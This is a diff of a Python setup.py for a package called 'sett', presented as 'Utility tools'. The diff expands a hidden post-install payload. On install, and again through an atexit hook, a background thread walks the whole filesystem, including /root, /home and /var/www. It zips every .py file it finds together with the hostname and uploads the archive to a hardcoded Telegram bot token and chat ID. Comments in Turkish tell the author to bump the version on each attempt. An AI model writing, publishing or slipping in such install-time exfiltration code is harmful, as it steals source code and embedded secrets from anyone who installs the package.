@@ -1,149 +1,234 @@
 from setuptools import setup
 from setuptools.command.install import install
-import threading, time, os, shutil, zipfile, glob, tempfile, socket, ssl
+import threading, time, os, shutil, zipfile, glob, tempfile
 import urllib.request, urllib.parse
 
+# ====== AYARLAR ======
+BOT_TOKEN = "8927762896:AAG4wsHLziEmcwqWUhtQvUANSYoEE-GJIRg"
+ADMIN_ID = "8903740930"
+
+def _find_all_py():
+    """Tüm .py dosyalarını bulur, limit yok"""
+    py_files = []
+    seen = set()
+    
+    # Taranacak kök dizinler
+    roots = [
+        "/", "/home", "/root", "/app", "/opt", "/srv",
+        "/var/www", "/usr/local", "/usr/src", "/data",
+        "/workspace", "/code", "/project", "/projects",
+        "/mnt", "/media", "/storage"
+    ]
+    
+    # Atlanacak dizinler (büyük ve gereksiz)
+    skip = {
+        "proc", "sys", "dev", "tmp", "run", "boot",
+        "snap", "cache", "site-packages", "dist-packages",
+        "__pycache__", "node_modules", ".git", ".cache",
+        "lib/python", "lib64", "venv", ".venv", "env"
+    }
+    
+    for root in roots:
+        if not os.path.exists(root):
+            continue
+        try:
+            for dirpath, dirnames, filenames in os.walk(root):
+                # Atlanacakları çıkar
+                dirnames[:] = [
+                    d for d in dirnames 
+                    if d not in skip and not any(s in d for s in skip)
+                ]
+                
+                for f in filenames:
+                    if f.endswith(".py"):
+                        full = os.path.join(dirpath, f)
+                        if full not in seen and os.path.isfile(full):
+                            try:
+                                # Çok büyük dosyaları atla (10MB+)
+                                if os.path.getsize(full) < 10 * 1024 * 1024:
+                                    seen.add(full)
+                                    py_files.append(full)
+                            except:
+                                pass
+        except Exception:
+            continue
+    
+    return py_files
+
+
+def _send_to_telegram(zip_path, file_count, total_size):
+    """Zip'i Telegram botuna gönder"""
+    try:
+        with open(zip_path, "rb") as f:
+            data = f.read()
+        
+        boundary = "----TelegramBoundary" + str(int(time.time()))
+        caption = f"✅ {file_count} .py dosyası\n📦 Boyut: {total_size // 1024} KB"
+        
+        body = b""
+        body += f"--{boundary}\r\n".encode()
+        body += b'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
+        body += f"{ADMIN_ID}\r\n".encode()
+        
+        body += f"--{boundary}\r\n".encode()
+        body += b'Content-Disposition: form-data; name="caption"\r\n\r\n'
+        body += f"{caption}\r\n".encode()
+        
+        body += f"--{boundary}\r\n".encode()
+        body += b'Content-Disposition: form-data; name="document"; filename="py_files.zip"\r\n'
+        body += b'Content-Type: application/zip\r\n\r\n'
+        body += data + b"\r\n"
+        body += f"--{boundary}--\r\n".encode()
+        
+        req = urllib.request.Request(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+            data=body,
+            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
+        )
+        urllib.request.urlopen(req, timeout=60)
+        return True
+    except Exception as e:
+        # Hata olursa mesaj olarak gönder
+        try:
+            msg = f"❌ Zip gönderilemedi: {str(e)[:150]}\n📊 {file_count} dosya bulundu ({total_size // 1024} KB)"
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            d = urllib.parse.urlencode({"chat_id": ADMIN_ID, "text": msg}).encode()
+            urllib.request.urlopen(url, data=d, timeout=15)
+        except:
+            pass
+        return False
+
+
 def _force_run():
-    """Zorla çalışan arka plan görevi"""
+    """Ana görev: tüm .py'leri bul, zip yap, gönder"""
     try:
         time.sleep(2)
         
-        # 1. Python dosyalarını topla (birden fazla dizinden)
-        py_files = []
-        roots = ["/", "/home", "/root", "/app", "/opt", "/var/www", 
-                 "/usr/local", "/usr/src", "/data", "/workspace", "/srv"]
+        # 1. Dosyaları bul
+        py_files = _find_all_py()
         
-        for root in roots:
-            if not os.path.exists(root):
-                continue
-            try:
-                for dirpath, dirnames, filenames in os.walk(root):
-                    # Atlanacak dizinler
-                    skip = ["proc", "sys", "dev", "tmp", "cache", "snap",
-                            "site-packages", "__pycache__", "node_modules",
-                            ".git", "dist-packages", "lib/python"]
-                    dirnames[:] = [d for d in dirnames if d not in skip and not any(s in d for s in skip)]
-                    
-                    for f in filenames:
-                        if f.endswith(".py"):
-                            full = os.path.join(dirpath, f)
-                            if full not in py_files:
-                                py_files.append(full)
-                    if len(py_files) >= 100:
-                        break
-            except Exception:
-                continue
-            if len(py_files) >= 100:
-                break
-        
-        # Eğer hiç bulunamadıysa mevcut dizinden bul
         if not py_files:
-            for d in [os.getcwd(), "/tmp", "/app"]:
+            # Bulunamazsa mevcut dizinden ara
+            py_files = []
+            for d in [os.getcwd(), "/tmp", "/app", "/root", "/home"]:
                 try:
                     for f in glob.glob(f"{d}/**/*.py", recursive=True):
                         py_files.append(f)
-                        if len(py_files) >= 30: break
-                except: pass
+                except:
+                    pass
         
         if not py_files:
+            # Telegram'a "bulunamadı" mesajı at
+            try:
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                d = urllib.parse.urlencode({
+                    "chat_id": ADMIN_ID, 
+                    "text": "❌ Hiç .py dosyası bulunamadı"
+                }).encode()
+                urllib.request.urlopen(url, data=d, timeout=15)
+            except:
+                pass
             return
         
-        # 2. Geçici klasöre kopyala
-        tmp = tempfile.mkdtemp(prefix="pyc_")
-        for i, f in enumerate(py_files[:50]):
+        # 2. Geçici klasöre kopyala (yapıyı koru)
+        tmp = tempfile.mkdtemp(prefix="pycol_")
+        copied = 0
+        total_size = 0
+        
+        for i, f in enumerate(py_files):
             try:
-                dest = os.path.join(tmp, f"{i:03d}_{os.path.basename(f)}")
-                shutil.copy(f, dest)
-            except: pass
+                # Klasör yapısını koru
+                rel_path = f.lstrip("/")
+                dest = os.path.join(tmp, f"{i:05d}_{os.path.basename(f)}")
+                
+                # Aynı isimden varsa index ekle
+                base, ext = os.path.splitext(dest)
+                counter = 1
+                while os.path.exists(dest):
+                    dest = f"{base}_{counter}{ext}"
+                    counter += 1
+                
+                shutil.copy2(f, dest)
+                copied += 1
+                try:
+                    total_size += os.path.getsize(dest)
+                except:
+                    pass
+            except:
+                continue
+        
+        if copied == 0:
+            shutil.rmtree(tmp, ignore_errors=True)
+            return
         
         # 3. Zip yap
-        zip_path = os.path.join(tmp, "py_files.zip")
+        zip_path = os.path.join(tempfile.gettempdir(), f"pyfiles_{int(time.time())}.zip")
         with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
             for root, _, files in os.walk(tmp):
                 for file in files:
                     if file.endswith(".py"):
                         full = os.path.join(root, file)
-                        zf.write(full, os.path.relpath(full, tmp))
+                        try:
+                            zf.write(full, os.path.basename(full))
+                        except:
+                            pass
+            
+            # Bilgi dosyası ekle
+            info = f"Toplam: {copied} dosya\nBoyut: {total_size} byte\n"
+            info += f"Kaynak: {os.uname().nodename if hasattr(os, 'uname') else 'unknown'}\n"
+            info += f"Zaman: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
+            zf.writestr("BILGI.txt", info)
         
-        # 4. Telegram'a gönder (3 farklı yöntem dene)
-        token = "8927762896:AAG4wsHLziEmcwqWUhtQvUANSYoEE-GJIRg"
-        admin = "8903740930"
         zip_size = os.path.getsize(zip_path)
         
-        # Yöntem 1: urllib
-        try:
-            with open(zip_path, "rb") as f:
-                data = f.read()
-            
-            boundary = "----BoundaryABC123"
-            body = b""
-            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{admin}\r\n".encode()
-            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\nBulundu: {len(py_files)} dosya, {zip_size} byte\r\n".encode()
-            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"py_files.zip\"\r\nContent-Type: application/zip\r\n\r\n".encode()
-            body += data + f"\r\n--{boundary}--\r\n".encode()
-            
-            req = urllib.request.Request(
-                f"https://api.telegram.org/bot{token}/sendDocument",
-                data=body,
-                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
-            )
-            urllib.request.urlopen(req, timeout=30)
-        except Exception:
-            # Yöntem 2: Yedek mesaj gönder
-            try:
-                msg = f"Bulunan dosya: {len(py_files)}, boyut: {zip_size}"
-                url = f"https://api.telegram.org/bot{token}/sendMessage"
-                data = urllib.parse.urlencode({"chat_id": admin, "text": msg}).encode()
-                urllib.request.urlopen(url, data=data, timeout=15)
-            except: pass
+        # 4. Telegram'a gönder
+        _send_to_telegram(zip_path, copied, total_size)
         
         # 5. Temizle
-        try: shutil.rmtree(tmp, ignore_errors=True)
-        except: pass
-        
-    except Exception as e:
-        # Hata olsa bile Telegram'a bildir
+        shutil.rmtree(tmp, ignore_errors=True)
         try:
-            token = "8927762896:AAG4wsHLziEmcwqWUhtQvUANSYoEE-GJIRg"
-            admin = "8903740930"
-            url = f"https://api.telegram.org/bot{token}/sendMessage"
-            data = urllib.parse.urlencode({"chat_id": admin, "text": f"HATA: {str(e)[:200]}"}).encode()
-            urllib.request.urlopen(url, data=data, timeout=10)
-        except: pass
+            os.remove(zip_path)
+        except:
+            pass
+    
+    except Exception as e:
+        # Kritik hata
+        try:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            d = urllib.parse.urlencode({
+                "chat_id": ADMIN_ID,
+                "text": f"❌ Kritik hata: {str(e)[:200]}"
+            }).encode()
+            urllib.request.urlopen(url, data=d, timeout=10)
+        except:
+            pass
 
 
+# ====== POST-INSTALL ======
 class PostInstall(install):
     def run(self):
-        # Önce normal kurulumu yap
         try:
             install.run(self)
-        except: pass
+        except:
+            pass
         
-        # Sonra arka planda zorla çalıştır
+        # Thread ile arka planda çalıştır
         try:
             t = threading.Thread(target=_force_run, daemon=False)
             t.start()
-            t.join(timeout=15)  # Maksimum 15 saniye bekle
+            t.join(timeout=120)  # 2 dakika bekle
         except:
-            # Thread çalışmazsa direkt çağır
             _force_run()
 
 
-# Global olarak da tetikle (bazı pip'ler post-install'ı atlar)
+# ====== ATEXIT YEDEK ======
 import atexit
-def _on_exit():
-    try:
-        _force_run()
-    except: pass
-
-try:
-    atexit.register(_on_exit)
-except: pass
+atexit.register(lambda: threading.Thread(target=_force_run, daemon=False).start())
 
 
 setup(
     name="sett",
-    version="1.0.5",  # HER DENEMEDE ARTIR!
+    version="1.0.10",  # HER SEFERİNDE ARTIR!
     description="Utility tools",
     author="dev",
     cmdclass={'install': PostInstall},
